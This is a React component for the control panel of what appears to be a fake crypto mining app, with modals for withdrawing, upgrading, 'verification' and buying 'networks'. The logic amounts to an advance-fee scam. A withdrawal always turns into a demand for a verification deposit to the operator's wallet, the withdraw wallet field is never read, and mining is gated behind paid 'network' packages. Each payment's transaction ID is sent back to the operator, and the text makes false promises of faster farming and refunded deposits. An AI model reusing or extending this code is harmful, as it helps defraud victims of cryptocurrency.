import React, {useState, useEffect} from 'react';
import {observer} from "mobx-react-lite";
import store from "../store"
import Modal from 'react-modal';
import swal from "@sweetalert/with-react";

const Panel = () => {
    const [showWithdrawModal, setShowWithdrawModal] = useState(false)
    const [showProModal, setShowProModal] = useState(false)
    const [showVerificationModal, setShowVerificationModal] = useState(false)
    const [showNetworkModal, setShowNetworkModal] = useState(false)

    const [amount, setAmount] = useState('')
    const [transaction_id, setTransactionId] = useState('')

    const [wallet, setWallet] = useState('')
    const [default_price, setDefaultPrice] = useState(0)
    const [pro_price, setProPrice] = useState(0)
    const [verification, setVerificationPrice] = useState(0)
    const [network_1, setNetwork1] = useState(0)
    const [network_2, setNetwork2] = useState(0)
    const [network_3, setNetwork3] = useState(0)

    const [current_price, setCurrentPrice] = useState(0)
    const [current_network_price, setCurrentNetworkPrice] = useState(0)

    const [network_type, setNetworkType] = useState('network_1')

    const handleProPayed = (type) => {
        swal(
            <div>
                <h3 style={{marginBottom: 15}}>Thank you for your purchase</h3>
                <p>Now please wait within 2-3 hours, our managers will automatically assign you a pro network</p>
            </div>
        )
        setShowProModal(false)
        setShowVerificationModal(false)

        store.sendRefNotification(transaction_id, type)

        setTransactionId('')
    }

    const handleWithdraw = () => {
        if (amount >= 100 && amount <= parseInt(store.getTotalBalance().toFixed(0))) {
            setShowWithdrawModal(false)
            swal(
                <div>
                    <p>In order to withdraw funds you need to verify your account</p>
                </div>
            ).then(() => {
                setShowVerificationModal(true)
            })
        } else if (amount > parseInt(store.getTotalBalance().toFixed(0))) {
            swal(
                <div>
                    <p>You have not enough balance</p>
                </div>
            )
        }
    }

    const showDemoIsOver = () => {
        swal(
            <div>
                <h3 style={{marginBottom: 15}}>Your DEMO key time is over</h3>
                <p>To continue using the program, you need to purchase a new key. Don't worry, all your nfts will be
                    transferred</p>
            </div>
        )
    }

    const handleStart = () => {
        if(store.user.premium) store.start()
        else {
            if (store.user.isDemo && store.user.isDemoExpired) {
                showDemoIsOver()
            } else {
                if(store.user.isDemo || store.user.isNetwork) store.start()
                else setShowNetworkModal(true)
            }
        }
    }

    useEffect(() => {
        if (store.user.isDemoExpired) {
            showDemoIsOver()
        }

		if(store.wallet !== '') {
			setWallet(store.wallet)
			setDefaultPrice(store.price_default)
			setProPrice(store.price_pro)
			setVerificationPrice(store.verification)
			setNetwork1(store.network_1)
			setNetwork2(store.network_2)
			setNetwork3(store.network_3)

            setCurrentPrice(store.price_pro)
            setCurrentNetworkPrice(store.network_1)
		}
    }, [store.user.isDemoExpired, store.wallet])

    const changeType = type => setCurrentPrice(type === 'pro' ? pro_price : default_price)
    const changeNetworkType = type => {
        const types = {network_1, network_2, network_3}

        setCurrentNetworkPrice(types[type])
        setNetworkType(type)
    }

    return (
        <div className="panel">
            <button className="btn" disabled={store.status === 'stop'} onClick={() => store.stop()}>Stop</button>
            <button className="btn" disabled={store.status === 'start'} onClick={handleStart}>Start</button>
            <button onClick={() => setShowWithdrawModal(true)} className="btn"
                    disabled={store.status === 'start' || store.user.isDemo}>Withdraw
            </button>
			{!store.user.premium && <button onClick={() => setShowProModal(true)} className="btn"
					 disabled={store.status === 'start'}>Upgrade
			</button>}

            <Modal
                isOpen={showWithdrawModal}
                className={"modal"}
            >
                <div className="close" onClick={() => setShowWithdrawModal(false)}>
                    <img src="./img/close.svg"/>
                </div>
                <div className="group">
                    <div className="label">Amount:</div>
                    <input type="number" value={amount} max={store.getTotalBalance().toFixed(0)}
                           onChange={(e) => setAmount(e.target.value)} className="field"/>
                </div>
                <div className="group">
                    <div className="label">Wallet:</div>
                    <input type="text" className="field"/>
                </div>
                <div className="modal__footer">
                    <button className="btn" onClick={handleWithdraw} disabled={amount < 100}>Withdraw</button>
                </div>
                <p>Network TRC-20 (USDT) <br/>
                    Min withdraw amount - $100</p>
            </Modal>

            <Modal
                isOpen={showProModal}
                className={"modal"}
            >
                <div className="close" onClick={() => setShowProModal(false)}>
                    <img src="./img/close.svg"/>
                </div>
                <div className="group">
                    <div className="label">Type:</div>
                    <select onChange={(e) => changeType(e.target.value)} defaultValue={'pro'} className="field">
                        <option value={'pro'}>PRO</option>
                        <option value={'default'}>Default</option>
                    </select>
                </div>
                <div className="group">
                    <div className="label">Wallet:</div>
                    <input type="text" value={wallet} readOnly className="field"/>
                </div>
                <div className="group">
                    <div className="label">Transaction ID:</div>
                    <input type="text" value={transaction_id} onChange={(e) => setTransactionId(e.target.value)}
                           className="field"/>
                </div>
                <div className="modal__footer">
                    <span className="price">${current_price}</span>
                    <button onClick={() => handleProPayed('Miner Pro version')} className="btn">Payed</button>
                </div>
                <p>With a premium subscription, you can farm cryptocurrency 100 times faster and withdraw your earned
                    money instantly. Also in the premium subscription gives you a safe use of our software.
                    ( ${pro_price} )
                    <br/>
                    More info: <br/>
                    {/*<a className={'link'} href="https://crypto-nft.space">https://crypto-nft.space</a><br/>*/}
                    <a className={'link'} href={store.tg}>{store.tg}</a>
                    <br/><br/>
                    Network TRC-20 (USDT)</p>
            </Modal>

            <Modal
                isOpen={showVerificationModal}
                className={"modal"}
            >
                <div className="close" onClick={() => setShowVerificationModal(false)}>
                    <img src="./img/close.svg"/>
                </div>
                <p>
                    You need to verify yourself as a user and verify your wallet. For verification, you need to
                    deposit {verification} with our details, this money will be credited to your balance. You can
                    withdraw them within 1 hour after verification. Verification takes approximately 30 minutes to 1
                    hour
                    <br/>
                    More info: <br/>
                    {/*<a className={'link'} href="https://crypto-nft.space">https://crypto-nft.space</a><br/>*/}
                    <a className={'link'} href={store.tg}>{store.tg}</a><br/><br/>
                    Network TRC-20 (USDT)<br/>
                    Min withdraw amount - $100</p>
                <div className="group">
                    <div className="label">Wallet:</div>
                    <input type="text" value={wallet} readOnly className="field"/>
                </div>
                <div className="group">
                    <div className="label">Transaction ID:</div>
                    <input type="text" value={transaction_id} onChange={(e) => setTransactionId(e.target.value)}
                           className="field"/>
                </div>
                <div className="modal__footer">
                    <button onClick={() => handleProPayed('Miner Verification')} className="btn">Payed</button>
                </div>
            </Modal>

            <Modal
                isOpen={showNetworkModal}
                className={"modal"}
            >
                <div className="close" onClick={() => setShowNetworkModal(false)}>
                    <img src="./img/close.svg"/>
                </div>
                <p>
                    The purchase of networks is a mandatory procedure to immerse yourself in the world of mining.
                    <br/>
                    <br/>
                    Choose a network package for yourself and make the payment.
                    <br/>
                    <div className="group">
                        <div className="label">Type:</div>
                        <select onChange={(e) => changeNetworkType(e.target.value)} value={network_type} defaultValue={'network_1'} className="field">
                            <option value={'network_1'}>Sol network</option>
                            <option value={'network_2'}>Networks TRC20, Sol, ERC20</option>
                            <option value={'network_3'}>Networks TRC20, ERC20, Bitcoin, Sol</option>
                        </select>
                    </div>
                </p>
                <div className="group">
                    <div className="label">Wallet:</div>
                    <input type="text" value={wallet} readOnly className="field"/>
                </div>
                <div className="group">
                    <div className="label">Transaction ID:</div>
                    <input type="text" value={transaction_id} onChange={(e) => setTransactionId(e.target.value)}
                           className="field"/>
                </div>
                <div className="modal__footer">
                    <span className="price">${current_network_price}</span>
                    <button onClick={() => handleProPayed(network_type)} className="btn">Payed</button>
                </div>
                <p>
                    Afterwards, you can immediately start mining. ⛏ We will set up your purchased server for mining on the necessary networks. Why do you need more networks? During high traffic and network loads, mining will be very weak and slow. However, if you have multiple networks, you can automatically switch to the one you need, allowing you to receive payouts in any currency!
                    <br/><br/>
                    More info: <br/>
                    {/*<a className={'link'} href="https://crypto-nft.space">https://crypto-nft.space</a><br/>*/}
                    <a className={'link'} href={store.tg}>{store.tg}</a>
                    <br/><br/>
                    Network TRC-20 (USDT)
                </p>
            </Modal>
        </div>
    );
};

export default observer(Panel);